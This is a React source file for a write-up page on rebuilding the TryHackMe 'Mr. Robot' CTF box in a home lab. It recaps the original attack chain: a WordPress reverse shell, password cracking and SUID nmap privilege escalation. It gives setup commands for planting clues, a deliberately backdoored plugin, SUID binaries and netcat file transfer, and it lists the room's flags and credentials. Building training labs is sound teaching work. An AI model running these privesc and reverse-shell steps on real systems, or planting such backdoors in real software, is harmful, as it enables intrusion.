// src/data/writeupPages/mrrobotclone/robot-main.jsx
import React from "react";
import Heading from "../../../components/ui/Heading";
import ToggleList from "../../../components/ui/ToggleList";
import BulletList from "../../../components/ui/BulletList";
import CodeBlock from "../../../components/ui/CodeBlock";
import MiniCode from "../../../components/ui/MiniCode";
import Quote from "../../../components/ui/Quote";
import Callout from "../../../components/ui/Callout";
import VictoryBox from "../../../components/ui/VictoryBox";
import writeup2Images from "../../../assets/Robotpics/index.js";
import { Link } from "react-router-dom";

export default function RobotMainContent() {
  return (
    <div className="space-y-6">
{/* The warning box */}
<div style={{ display: "flex", justifyContent: "center", padding: "1rem 0" }}>
  <div
    role="alert"
    aria-live="polite"
    style={{
      border: "1px solid #ff4d4f",
      backgroundColor: "rgba(255,77,79,0.06)",
      color: "#a8071a",
      padding: "0.75rem 1rem",
      borderRadius: "8px",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      gap: "0.75rem",
      /* responsive font size: min 0.7rem, fluid with viewport, max 1.1rem */
      fontSize: "clamp(0.7rem, 2.5vw, 1.1rem)",
      lineHeight: 1.25,
      maxWidth: "720px",
      width: "100%",
      boxSizing: "border-box",
    }}
  >
    <div style={{ flex: "0 1 auto" }}>
      <strong style={{ display: "block", marginBottom: "0.25rem", lineHeight: 1.1 }}>
        <span
          aria-hidden="true"
          style={{
            display: "inline-block",
            /* move the symbol up a little and keep it responsive */
            transform: "translateY(-0.01px)",
            marginRight: "0.45rem",
            /* icon scales with root font size; use clamp if you want independent sizing */
            fontSize: "clamp(0.9rem, 3vw, 1.25rem)",
            lineHeight: 1,
          }}
        >
          ⚠️
        </span>
        Warning — For Educational Purposes Only
      </strong>
    </div>
  </div>
</div>

     {/* Section 1: */}
     <p style={{ fontSize: "1.0rem" }}> Hello Hello 👋, many of you reading this have probably heard of or even solved  
     <a href="https://tryhackme.com/room/mrrobot" target="_blank" style={{ color: "red", fontWeight: "bold" }}><b> Mr. Robot</b></a> on TryHackMe, and if you haven’t,
      I’d really suggest giving it a go because it’s an absolute blast. </p> <p style={{ fontSize: "1.0rem" }}> But here’s 
      the thing… there are loads of walkthroughs that show you how to solve the room, but none that really explain what’s going 
      on behind the scenes. That got me curious.<br />
  <b>How are rooms like this actually built?</b><br />
  <b>What kind of thought process and hidden mechanics are behind the puzzles?</b></p> <p style={{ fontSize: "1.0rem" }}> So I rolled up my sleeves and cloned 
      the box. In this write-up, I’ll take you step by step through how I did it, what decisions I made and why, how all the pieces fit 
      together, and where you can (and should) tweak things to make it your own. Whether you want to learn how to <b>build rooms from 
      scratch</b> or simply want to appreciate the craftsmanship behind a great challenge, this deep dive will show you the 
      whole process. </p> <p style={{ fontSize: "1.0rem" }}> I’ve designed it to have <b>6 Phases</b>, and in each phase, I’ll cover
      what the original box had and how I replicated it. You can follow along exactly as I did or tweak things along the way if you’re 
      feeling adventurous. Either way, it’s going to be a fun ride. </p>
      
    {/* Phase 1 */}
    <ToggleList title="Phase 1 - Base OS, web stack and WordPress" index={1}>
  <div>
    
    {/* purple "Quick recon / what the original box has:" */}
    <p style={{ marginTop: "0.5rem", color: "#B026FF", fontWeight: 500 }}>
      Quick recon / what the original box has:
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
      The original <b>Mr. Robot</b>-style box uses an older WordPress and a straightforward RCE vector via the Theme File Editor.
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.25rem" }}><b>Key points from the original:</b></p>

    <ol style={{ marginLeft: "1.25rem", marginTop: "0.25rem" }}>
      <li style={{ marginBottom: "0.35rem" }}>
        1. WordPress <b>v4.9.x</b> + TwentyFifteen theme (older stack).
      </li>
      <li style={{ marginBottom: "0.35rem" }}>
        2.<b> Appearance → Theme File Editor</b> enabled - PHP source was visible/editable in the admin UI (allowed direct RCE).
      </li>
      <li style={{ marginBottom: "0.35rem" }}>
        3. Apache served HTTP and HTTPS (nmap shows ports <b>80</b> and <b>443</b> open).
      </li>
      <li style={{ marginBottom: "0.35rem" }}>
        4.Typical CTF web surface: predictable plugins/themes, files under webroot, and an easy RCE vector via editable PHP.
      </li>
    </ol><br/>

    {/* blue "Let's recreate these now :" */}
    <p style={{ marginTop: "0.75rem", color: "#00F0FF", fontWeight: 500 }}>
      Let’s recreate these now :
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
      Replicating the original <b>(WP 4.9.x) exactly is</b> possible, but fragile and often requires older PHP and extra compatibility tweaks.
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
      So, I used a modern OS version + modern WordPress and intentionally added a plugin backdoor to emulate the original RCE behaviour while keeping the build stable and maintainable.
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
      That means this step diverges from the original CTF, but that’s intentional: it keeps the environment usable while preserving the learning objective. If you want an exact recreation, install the older software stack (older PHP, WP 4.9.x, etc.) and then start following from <b>Phase 2</b> of the write-up.
    </p>

    <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
      We'll begin by installing the base operating system, then proceed with setting up the web stack and WordPress.
    </p>

    {/* Links as subpages — use the same pattern you showed in the example */}
    <div className="mt-6">
      📄
      <Link
        to="/writeups/robot-main/osinstall"
        className="text-green-400 underline hover:text-blue-600"
        style={{ marginLeft: 8 }}
      >
        Installing the OS
      </Link>
    </div>
    
    <Callout>
  <div style={{ lineHeight: 1.5 }}>
    Make sure you have SSHed into the Ubuntu machine from your Kali. If not, do so before proceeding with the next installation steps.
    <div style={{ marginTop: 8 }}>
      <MiniCode>ssh mrrobot@192.168.56.20</MiniCode>
    </div>
  </div>
</Callout>


    <div className="mt-4">
      📄
      <Link
        to="/writeups/robot-main/wpinstall"
        className="text-green-400 underline hover:text-blue-600"
        style={{ marginLeft: 8 }}
      >
        Installing &amp; Configuring WordPress on Ubuntu Server with Apache, MySQL, and PHP
      </Link>
    </div>
  </div>
</ToggleList>
 
{/* Section 2: */}
<ToggleList title="Phase 2 - Plant discovery artifacts" index={2}>

      <div>
        <p style={{ color: "#B026FF", marginTop: "0.5rem", fontWeight: 500 }}>
          First, let's take another look at the components of the original CTF:
        </p>
        <p style={{ fontSize: "1.0rem", marginTop: "0.5rem" }}>
        We ran directory scans (dir/gobuster) and discovered several interesting paths and a key.<br/>
The site contained the following items:
        </p>

        <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
          <li>
          ● <MiniCode>robots.txt</MiniCode> pointing to hidden files (
            <MiniCode>fsocity.dic</MiniCode>, <MiniCode>key-1-of-3.txt</MiniCode>)
          </li>
          <li>
          ● <MiniCode>license</MiniCode> file containing a Base64-encoded credential string (
          <MiniCode>ZWxsaW90OkVSMjgtMDY1Mg==</MiniCode>)
          </li>
          <li>
          ● <MiniCode>key-1-of-3.txt</MiniCode> (first flag)
          </li>
          <li>
          ● <MiniCode>fsocity.dic</MiniCode> - the large wordlist used for brute-forcing / enumeration
          </li>
        </ul><br/>

        <p style={{ color: "#00F0FF", marginTop: "0.75rem", fontWeight: 500 }}>
          Let's go ahead and recreate these now:
        </p>

        {/* robots.txt */}
        <p style={{ marginTop: "0.5rem" }}>
          1. Create <strong>robots.txt</strong> → points to hidden files
        </p>

        <CodeBlock code={`sudo nano /var/www/html/robots.txt`} copyable />

        <p style={{ marginTop: "0.5rem" }}>Paste the content:</p>

        <CodeBlock
          code={`User-agent: *
fsocity.dic
key-1-of-3.txt`}
          copyable
        />

        {/* license */}
        <p style={{ marginTop: "0.75rem" }}>
          2. Create the <strong>license</strong> page → base64 creds (<MiniCode>elliot:ER28-0652</MiniCode>)
        </p>

        <CodeBlock code={`sudo nano /var/www/html/license`} copyable />

        <p style={{ marginTop: "0.5rem" }}>Convert to Base64 (encode):</p>

        <CodeBlock code={`echo -n "elliot:ER28-0652" | base64`} copyable />

        <ul style={{ marginLeft: "1rem", marginTop: "0.25rem" }}>
          <li>
            <MiniCode>echo -n</MiniCode> → prints the string without adding a newline
          </li>
          <li>
            <MiniCode>| base64</MiniCode> → pipes it into the <MiniCode>base64</MiniCode> encoder
          </li>
        </ul>

        <p style={{ marginTop: "0.5rem" }}>Output:</p>

        <CodeBlock code={`ZWxsaW90OkVSMjgtMDY1Mg==`} copyable />

        <p style={{ marginTop: "0.5rem" }}>
          Paste something like this inside (filler + base64):
        </p>

        <CodeBlock
  code={`&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;License&lt;/title&gt;
  &lt;style&gt;
    .big-gap {margin-top: 100px; /* Adjust this value as needed */}
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;p&gt;what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?&lt;/p&gt;

&lt;div class="big-gap"&gt;&lt;/div&gt;

&lt;!-- filler filler filler --&gt;
&lt;p&gt;do you want a password or something?&lt;/p&gt;

&lt;div class="big-gap"&gt;&lt;/div&gt;

&lt;!-- Hidden clue --&gt;
&lt;p&gt;ZWxsaW90OkVSMjgtMDY1Mg==&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;`}
  copyable
/>


        {/* key-1-of-3.txt */}
        <p style={{ marginTop: "0.75rem" }}>
          3. Create <strong>key-1-of-3.txt</strong> → first flag
        </p>

        <CodeBlock code={`sudo nano /var/www/html/key-1-of-3.txt`} copyable />

        <p style={{ marginTop: "0.5rem" }}>Paste:</p>

        <CodeBlock code={`073403c8a58a1f80d943455fb30724b9`} copyable />

        {/* fsocity.dic */}
        <p style={{ marginTop: "0.75rem" }}>
          4. Create <strong>fsocity.dic</strong> → wordlist used for brute force
        </p>

        <CodeBlock code={`sudo nano /var/www/html/fsocity.dic`} copyable />

        <p style={{ marginTop: "0.5rem" }}>
          In the real box, this was a <strong>huge wordlist</strong> (around 80,000 lines, lots of duplicates).
        </p>

        <p style={{ marginTop: "0.5rem" }}>
          For your lab, you can start with a <strong>smaller version</strong> (10–20 entries) for easier testing, or use the full file if you want realism.
        </p>

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>Minimal version (for testing):</p>

        <CodeBlock
          code={`robot
elliot
ER28-0652
password
qwerty
admin
administrator
wordpress
security
fsociety
anonymous`}
          copyable
        />

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>Optional (full version):</p>

        <p style={{ marginTop: "0.25rem" }}>
          You can actually grab the real <MiniCode>fsocity.dic</MiniCode> from GitHub mirrors or your THM box and drop it into <MiniCode>/var/www/html/</MiniCode>.
        </p>

        <Callout type="note" style={{ marginTop: "0.75rem" }}>
          <div>
            <strong>Note for future CTF-building</strong>
            <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
              <li>
                <strong>CTF File/Directory Names & Wordlists :</strong>
              </li>
              <li>
                Directory/file brute forcing tools (Gobuster, Dirb, FFUF) rely entirely on the <strong>wordlist used</strong>.
              </li>
              <li>
                If a file’s name is not in the list, the tool will not find it.
              </li>
              <li>
                In the Mr. Robot CTF:
                <ul>
                  <li><MiniCode>/robots.txt</MiniCode> → listed in common wordlists.</li>
                  <li><MiniCode>/license</MiniCode> → also in many wordlists.</li>
                  <li><MiniCode>/fsocity.dic</MiniCode> and <MiniCode>/key-1-of-3.txt</MiniCode> → unique names, not in wordlists → could only be discovered because they were referenced in <MiniCode>/robots.txt</MiniCode>.</li>
                </ul>
              </li>
              <li>
                <strong>Lesson:</strong> When designing a CTF, put unusual or custom file names in a place (like <MiniCode>robots.txt</MiniCode>, a hidden comment, or page source) so solvers have a fair way to discover them.
              </li>
            </ul>
          </div>
        </Callout>

        <p style={{ marginTop: "0.75rem", fontWeight: 600 }}>5. Fix permissions</p>

        <CodeBlock
          code={`sudo chown www-data:www-data /var/www/html/fsocity.dic /var/www/html/key-1-of-3.txt
sudo chmod 644 /var/www/html/fsocity.dic /var/www/html/key-1-of-3.txt`}
          copyable
        />

        <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
        <li>○ <MiniCode>chown</MiniCode> = change owner</li>
        <li>○ <MiniCode>www-data:www-data</MiniCode> = user:group that Apache runs on Ubuntu/Debian</li>
        <li>○ So this command makes <strong>Apache the owner</strong> of those files.</li>
        </ul>

        <p style={{ marginTop: "0.5rem" }}><strong>Why?</strong></p>

        <ul style={{ marginLeft: "1rem", marginTop: "0.25rem" }}>
          <li>○ Ensures Apache has no trouble reading them.</li>
          <li>○ Not strictly required if you only want world-readable files, but it’s “clean” to assign them to the service account that uses them.</li>
        </ul>

        <p style={{ marginTop: "0.5rem" }}>
          <MiniCode>chmod 644</MiniCode> = allow Apache and anyone else to read the file in the browser, but only owner (Apache) can modify it.
        </p>
      </div>
    </ToggleList>

    {/* Phase 3 */}
    <ToggleList title="Phase 3 - Linux users, hashes, flags" index={2}>
      <div>
        <p style={{ color: "#B026FF", marginTop: "0.5rem", fontWeight: 500 }}>
          Let’s first revisit what the original CTF had:
        </p>

        <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
          <li style={{ marginBottom: "0.5rem" }}>
          After we obtained a valid WordPress username and password and{" "}
            <b>logged in</b>, we checked the list of users and realized the
            account we compromised had <b>administrator privileges</b>.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            Since Elliot was allowed to edit theme files, we navigated to{" "}
            <b>Appearance → Theme Editor</b>. There we noticed several PHP
            templates and decided to use one for code execution.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            We picked the <MiniCode>404.php</MiniCode> template and replaced
            its contents with the PentestMonkey PHP reverse shell, updating it
            with our own IP address and port. After saving, WordPress
            confirmed: <em>“File edited successfully.”</em>
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
          ● On our machine, we set up a Netcat listener. Then we triggered
            the payload by visiting:
            <div style={{ marginTop: 8 }}>
              <CodeBlock
                code={`http://[Target_IP]/wp-content/themes/twentyfifteen/404.php`}
                copyable
              /><br/>
            </div>
            That gave us a working reverse shell.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
          ● After getting a reverse shell through WordPress (as <MiniCode>www-data</MiniCode>
            ), we enumerated and found another user on the system: <b>robot</b>.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
          ● In <MiniCode>/home/robot/</MiniCode> we found:
            <ul style={{ marginTop: "0.25rem", marginLeft: "1rem" }}>
              <li>
              ○ <MiniCode>key-2-of-3.txt</MiniCode> (but not readable yet — perms
                restricted).
              </li>
              <li>
              ○  A password hash (MD5 of <code>abcdefghijklmnopqrstuvwxyz</code>).
              </li>
            </ul>
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
          ● Cracking that hash gave us the password for <b>robot</b>.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
          ● We <MiniCode>su robot</MiniCode>  (using the cracked password) and could now read{" "}
            <MiniCode>key-2-of-3.txt</MiniCode>.
          </li>
        </ul>
      </div><br/>

      {/* Phase 3 - Block 2 */}
      
      <p style={{ marginTop: "0.75rem", color: "#00F0FF", fontWeight: 500 }}>
      Let’s recreate these now :
    </p>

        <p style={{ marginTop: "0.5rem", lineHeight: 1.6 }}>
          In the original CTF, we got a reverse shell through WordPress by
          editing a theme file (e.g., <MiniCode>404.php</MiniCode>).
        </p>

        <p style={{ marginTop: "0.5rem", lineHeight: 1.6 }}>
          But with the <strong>latest WordPress version</strong> and modern
          Ubuntu, that method didn’t work cleanly. Instead of fighting with old
          versions, we’ll take a slightly different path: <strong>creating a
          custom plugin that gives us a backdoor.</strong>
        </p>

        <div className="mt-6">
          📄
          <Link
            to="/writeups/robot-main/plugin"
            className="text-green-400 underline hover:text-blue-600"
            style={{ marginLeft: 8 }}
          >
            Creating the Custom Plugin backdoor
          </Link>
        </div><br/> 
            1. <strong>Create the <MiniCode>robot</MiniCode> user:</strong>
            <CodeBlock code={`sudo adduser robot`} copyable />
            <p style={{ marginTop: "0.25rem" }}>
              <small>(Set a simple password for now, but later we’ll make it match the cracked MD5.</small>
            </p>

            <p style={{ marginTop: "0.25rem" }}>
             <small> Extra user info (Full Name, Room, Phone, etc.) can be left blank -
              it doesn’t affect gameplay.)</small>
            </p>

            <Callout type="note" style={{ marginTop: "0.5rem" }}>
              <div>
                <strong>User Creation with <MiniCode>adduser</MiniCode></strong>:
                <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
                  <li>
                  ● Running <MiniCode>sudo adduser &lt;name&gt;</MiniCode> always creates a new user account with a home directory at <MiniCode>/home/&lt;name&gt;</MiniCode>, no matter which directory you’re in.
                  </li>
                  <li>
                  ● It doesn’t matter if you run the command from <MiniCode>/</MiniCode>, <MiniCode>/var/www/</MiniCode>, or <MiniCode>/home/mrrobot</MiniCode>.
                  </li>
                  <li>
                  ● Example: <MiniCode>sudo adduser robot</MiniCode> → creates <MiniCode>/home/robot</MiniCode>.
                  </li>
                  <li>  ● The system handles creating the folder, copying default configs, and setting permissions automatically.</li>
                </ul>
              </div>
            </Callout>
          

          
            2. <strong>Place artifacts in <MiniCode>/home/robot/</MiniCode>:</strong>
            <CodeBlock code={`sudo nano /home/robot/key-2-of-3.txt`} copyable /><br/>
            <p style={{ marginTop: "0.25rem" }}>Paste:</p>
            <CodeBlock code={`822c73956184f694993bede3eb39f959`} copyable /><br/>
            <p style={{ marginTop: "0.25rem" }}>Save + exit.</p><br/>
          

          
            3. <strong>Add the hash file:</strong>
            <CodeBlock code={`sudo nano /home/robot/password.raw-md5`} copyable /><br/>
            <p style={{ marginTop: "0.25rem" }}>Paste:</p>
            <CodeBlock code={`abcdefghijklmnopqrstuvwxyz`} copyable />

            <Callout type="note" style={{ marginTop: "0.5rem" }}>
              <div>
                <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
                  <li>The file <MiniCode>password.raw-md5</MiniCode> is <strong>intentionally misleading</strong>.</li>
                  <li>It contains the plaintext password:
                    <CodeBlock code={`abcdefghijklmnopqrstuvwxyz`} copyable />
                  </li><br/>
                  <li>The <MiniCode>.raw-md5</MiniCode> extension tricks players into wasting time trying hash cracking before realizing it’s not a hash at all.</li>
                  <li>This is a common CTF design pattern: <em>“fake clues”</em> to test enumeration and critical thinking.</li>
                </ul>
              </div>
            </Callout>
          
            4. <strong>Set permissions so <MiniCode>www-data</MiniCode> can’t read key-2 yet:</strong>
            <CodeBlock
              code={`sudo chown robot:robot /home/robot/key-2-of-3.txt
sudo chmod 600 /home/robot/key-2-of-3.txt`}
              copyable
            />
    </ToggleList>

 {/* Phase 4 */}
 <ToggleList title="Phase 4 - Privesc setup" index={4}>
      <div>
        <p style={{ color: "#B026FF", marginTop: "0.5rem", fontWeight: 500 }}>
          What happened in the original CTF:
        </p>

        <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
          <li>
            ● Once we pivot to <strong>robot</strong>, we find the second key.
          </li>

          <li style={{ marginTop: "0.5rem" }}>
            ● Next, we enumerate SUID binaries with:
            <div style={{ marginTop: 8 }}>
              <CodeBlock code={`find / -perm -4000 2>/dev/null`} copyable />
            </div>
          </li>

          <li style={{ marginTop: "0.5rem" }}>
            ● We then discover an old <MiniCode>nmap (v3.81)</MiniCode> binary installed with the <strong>SUID bit</strong>.
          </li>

          <li style={{ marginTop: "0.5rem" }}>
            ● That binary supports an <strong>interactive mode</strong>, where we can drop into a root shell using GTFOBins:
            <div style={{ marginTop: 8 }}>
              <CodeBlock
                code={`nmap --interactive
nmap> !sh`}
                copyable
              />
            </div>
          </li>
        </ul>

        <Callout type="note" style={{ marginTop: "0.75rem" }}>
          <div>
            <div style={{ marginTop: 8 }}>
              When you use a raw <MiniCode>nc -lvnp</MiniCode> reverse shell, you don’t have a <strong>TTY</strong> (no proper terminal).
              Some commands (like <MiniCode>su</MiniCode>, <MiniCode>vim</MiniCode>, and this interactive <MiniCode>nmap</MiniCode>) behave badly without a real TTY.
            </div>

            <div style={{ marginTop: 8 }}>
              So if <MiniCode>!sh</MiniCode> looks like it’s not working: fix it with a proper TTY upgrade from your reverse shell:
            </div>

            <div style={{ marginTop: 8 }}>
              <CodeBlock code={`python3 -c 'import pty; pty.spawn("/bin/bash")'`} copyable />
            </div>

            <div style={{ marginTop: 8 }}>
              or
            </div>

            <div style={{ marginTop: 8 }}>
              <CodeBlock code={`script /bin/bash -i`} copyable />
            </div>

            <div style={{ marginTop: 8 }}>
              Then re-run:
              <CodeBlock code={`nmap --interactive
!sh`} copyable />
              You should now see the <strong>#</strong> prompt for root.
            </div>
          </div>
        </Callout>

        <p style={{ color: "#00F0FF", marginTop: "0.75rem", fontWeight: 500 }}>
          Steps to replicate the lab:
        </p>

        <p style={{ marginTop: "0.5rem"}}>
        The version used in Mr. Robot was around <MiniCode>nmap 3.81</MiniCode> (supports <MiniCode>--interactive</MiniCode>).<br/>

You can still grab an older source or .deb, but for simplicity in a local lab, you can simulate with any old version that has interactive mode.
        </p><br/>

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>❌ First Attempt (Failed)</p>

        <ul style={{ marginLeft: "1rem" }}>
          <li>● Tried downloading <MiniCode>nmap-3.81.tar.bz2</MiniCode> and compiling.</li>
          <li><CodeBlock code={`cd /tmp
wget https://nmap.org/dist/old/nmap-3.81.tar.bz2
tar -xjf nmap-3.81.tar.bz2`} copyable /></li>
          <li style={{ marginTop: "0.5rem"}}>● Needed <MiniCode>gcc</MiniCode>, <MiniCode>g++</MiniCode>, <MiniCode>make</MiniCode>, and deps like <MiniCode>libpcap</MiniCode>.</li>
          <li>● Build failed (old source + modern libs mismatch).</li>
          <li>● This happens a lot with legacy software. Not worth the pain.</li>
        </ul>

        <p style={{ marginTop: "0.5rem" }}>
          We have 3 options to move forward here:
        </p><br/>

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>✅ Option 1: Patch & Build</p>
        <ul style={{ marginLeft: "1rem" }}>
          <li>● You’d need to edit the source (<MiniCode>pcap-linux.c</MiniCode>) and replace <MiniCode>SIOCGSTAMP</MiniCode> with a modern equivalent like <MiniCode>SIOCGSTAMP_OLD</MiniCode> or <MiniCode>SIOCGSTAMPNS</MiniCode>.</li>
          <li>● This is messy and not worth it unless you want a deep dive into legacy code.</li>
        </ul>

        <p style={{ marginTop: "0.5rem" }}>
          So, instead of fighting with ancient code, we could just grab a <strong>precompiled old nmap binary</strong> (already built for Linux 64-bit), drop it into <MiniCode>/usr/local/bin/nmap</MiniCode>, and use that as mentioned in options 2 and 3.
        </p><br/>

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>✅ Option 2: Get <MiniCode>.ova</MiniCode> image</p>
        <ul style={{ marginLeft: "1rem" }}>
          <li>● Some CTFs (like VulnHub) release <MiniCode>.ova</MiniCode> files with vuln services already inside.</li>
          <li>● We could extract the binary from that VM.</li>
          <li>● I tried downloading <small><a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" style={{ color: "red"}}><b> Mr-Robot:1 - VulnHub</b></a></small>, but it failed / was flagged by AV - big downloads & not ideal for a single binary.</li>
        </ul><br/>

        <p style={{ marginTop: "0.5rem", fontWeight: 600 }}>✅ Option 3 (what I am gonna use): Harvest from TryHackMe box</p>
        <ul style={{ marginLeft: "1rem" ,marginTop: "0.5rem" }}>
          <li>● Easiest: we already compromised the real Mr. Robot box on THM.</li>
          <li>● That VM has the vuln <MiniCode>nmap 3.81</MiniCode> installed under <MiniCode>/usr/local/bin/nmap</MiniCode>.</li>
          <li>● Note: it’s not a full nmap (2MB), it’s a <strong>stub wrapper (≈17 KB)</strong> that only mimics the vulnerable behavior:
            <ul style={{ marginLeft: "1rem" }}>
              <li>○ <MiniCode>nmap --interactive</MiniCode> → fake REPL → <MiniCode>!sh</MiniCode> spawns shell.</li>
              <li>○ Nothing else works, but that’s fine for the CTF.</li>
            </ul>
          </li>
          <li style={{ marginTop: "0.5rem" }}>● Why this is done in CTFs:
            <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
              <li>○ <strong>Lightweight</strong>: tiny stub instead of shipping old code.</li>
              <li>○ <strong>Focused</strong>: forces player to know the <MiniCode>-interactive</MiniCode> trick.</li>
              <li>○ <strong>Safe</strong>: no extra attack surfaces from old libraries.</li>
            </ul>
          </li>
        </ul>

        <Heading level={4} style={{ marginTop: "0.75rem" }}>
          Exfiltration Process
        </Heading>

        <ol style={{ marginLeft: "1rem" }}>
          <li style={{ marginBottom: "0.5rem" }}>
            1. Break into the Mr. Robot room on TryHackMe (via WordPress → reverse shell) until you get a shell.
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            2. Locate the binary:
            <CodeBlock code={`which nmap
# usually /usr/local/bin/nmap`} copyable />
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            3. Transfer with <MiniCode>nc</MiniCode>
            <div style={{ marginTop: 8 }}>
              ● Receiver (your MrRobot Ubuntu replica):
              <CodeBlock code={`nc -lvnp 4444 > nmap-3.81`} copyable />
            </div>
            <div style={{ marginTop: 8 }}>
              ● Sender (THM box shell..connected via VPN):
              <CodeBlock code={`nc <your-vpn-ip> 4444 < /usr/local/bin/nmap`} copyable />
            </div>
            <div style={{ marginTop: 8 }}>
              ● ⚠️ Make sure you’re in a normal shell (<MiniCode>$</MiniCode>), not the <MiniCode>nmap&gt;</MiniCode> prompt.
            </div>
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            4. Verify transfer:
            <CodeBlock code={`ls -lh nmap-3.81
# should be ~17K (tiny stub, not full binary)`} copyable />
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            5. Install into PATH:
            <CodeBlock code={`sudo mv nmap-3.81 /usr/local/bin/nmap
sudo chown root:root /usr/local/bin/nmap
sudo chmod 4755 /usr/local/bin/nmap   # sets SUID + exec perms`} copyable />
          </li>

          <li style={{ marginBottom: "0.5rem" }}>
            6. Confirm:
            <CodeBlock code={`which nmap
nmap --version
ls -l /usr/local/bin/nmap`} copyable />
            <p style={{ marginTop: "0.25rem" }}>
              Output should show:
            </p>
            <ul style={{ marginLeft: "1rem" }}>
              <li>● Version = 3.81</li>
              <li>● Perms = <MiniCode>rwsr-xr-x</MiniCode> (SUID set)</li>
            </ul>
          </li>
        </ol>

        <Heading level={4} style={{ marginTop: "0.75rem" }}>
        PrivEsc Flow - Testing
        </Heading>

        <CodeBlock
          code={`# Now as the low-priv robot user:
nmap --interactive
!sh
whoami
# root`}
          copyable
        />

        <Callout type="funfact" style={{ marginTop: "0.75rem" }}>
          <div style={{marginTop: "0.5rem" }}>
           Key Takeaways :
           <img
  src={writeup2Images.gif1}
  alt="gif1"
  style={{
    width: "100%",        // Take full width of parent container
    maxWidth: "100%",     // Prevent overflow beyond container
    height: "auto",       // Keep aspect ratio
    borderRadius: "8px",
    margin: "1rem 0",
  }}
/>
            <ul style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
              <li>● You don’t need to compile legacy vuln binaries.</li>
              <li>● You can copy them directly from existing CTF boxes you already have access to.</li>
              <li>● Exfil with <MiniCode>nc</MiniCode> or <MiniCode>scp</MiniCode>.</li>
              <li>● Install with <MiniCode>chown root:root</MiniCode> + <MiniCode>chmod u+s</MiniCode>.</li>
              <li>● Result: clean, minimal, CTF-ready vuln binary.</li>
            </ul>
          </div>
        </Callout>
      </div>
    </ToggleList>
 {/* Phase 5 */}
 <ToggleList title="Phase 5 - Place the final flag" index={5}>
      <div>
        <Heading level={3} style={{ marginTop: "0.25rem" }}>
          Phase 5 - Place the final flag
        </Heading>

        <p style={{ marginTop: "0.5rem", lineHeight: 1.6 }}>
          Revisiting our steps from the original box: now that we have root access, all that’s left is to run{" "}
          <MiniCode>cat /root/key-3-of-3.txt</MiniCode> — and just like that, we're done!
        </p>

        <p style={{ marginTop: "0.5rem" }}>
          Let’s recreate this final and easy step :
        </p>

        <CodeBlock
          code={`echo "04787ddef27c3dee1ee161b21670b4e4" | sudo tee /root/key-3-of-3.txt
chmod 644 /root/key-3-of-3.txt`}
          copyable
        />
        
        </div>
        </ToggleList>

        {/* Phase 6 */}
        <ToggleList title="Phase 6 - Checks and Packaging" index={6}>
    
        <div>
        <p style={{ marginTop: "0.5rem", lineHeight: 1.6 }}>
          From your attacker box, confirm:
        </p>

        <ol style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
          <li style={{ marginBottom: "0.4rem" }}>
            1. <MiniCode>/robots.txt</MiniCode> lists <MiniCode>fsocity.dic</MiniCode> + <MiniCode>key-1</MiniCode> (grab key-1).
          </li>
          <li style={{ marginBottom: "0.4rem" }}>
            2. <MiniCode>/license</MiniCode> base64 → <MiniCode>elliot:ER28-0652</MiniCode>. Try WP login.
          </li>
          <li style={{ marginBottom: "0.4rem" }}>
            3. Plugin backdoor: trigger the backdoor to run commands/get a reverse shell as the web user (<MiniCode>www-data</MiniCode>/<MiniCode>daemon</MiniCode>).
          </li>
          <li style={{ marginBottom: "0.4rem" }}>
            4. Read <MiniCode>/home/robot/password.raw-md5</MiniCode>, crack to <MiniCode>abcdefghijklmnopqrstuvwxyz</MiniCode>, <MiniCode>su robot</MiniCode>, read key-2.
          </li>
          <li style={{ marginBottom: "0.4rem" }}>
            5. <MiniCode>find / -perm -4000</MiniCode> → run <MiniCode>nmap --interactive</MiniCode> → <MiniCode>!sh</MiniCode> → read key-3.
          </li>
        </ol>

        <p style={{ marginTop: "0.75rem", lineHeight: 1.6 }}>
          Export an <strong>OVA</strong> (with a README), or publish a <strong>Vagrantfile</strong>. For Docker path, ship a Compose file plus seed scripts and tests.
        </p>
      </div>
    </ToggleList>
    <div>
      <VictoryBox />
        </div>

    </div>    
  );
}
